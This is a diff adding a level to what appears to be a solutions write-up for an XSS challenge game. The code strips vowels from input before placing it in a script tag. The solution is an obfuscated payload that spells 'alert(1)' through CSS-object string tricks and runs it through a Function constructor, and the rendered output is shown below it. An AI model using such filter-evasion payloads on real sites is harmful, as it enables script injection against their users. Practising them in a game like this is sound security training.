@@ -12,6 +12,7 @@
 - [JSON2](#json2)
 - [Well](#well)
 - [No](#no)
+- [K'Z'K](#kzk)
 
 ## Warmup
 
@@ -204,4 +205,30 @@ function escape(s) {
 var string = "";string=1;console.log=alert//";
 console.log(string);
 </script>
+```
+
+## K'Z'K
+
+- The code below generates HTML in an unsafe way. Prove it by calling alert(1).
+
+
+```
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels in honor of K'Z'K the Destroyer
+    s = s.replace(/[aeiouy]/gi, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+
+- Solution
+
+```
+"+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"
+```
+
+- Output
+
+```
+<script>console.log(""+[]['p'+[CSS+''][0][1]+'p']['c'+[CSS+''][0][1]+'nstr'+[CSS[0]+''][0][0]+'ct'+[CSS+''][0][1]+'r']([CSS*CSS+''][0][1]+'l'+[CSS[0]+''][0][3]+'rt(1)')()+"");</script>
 ```
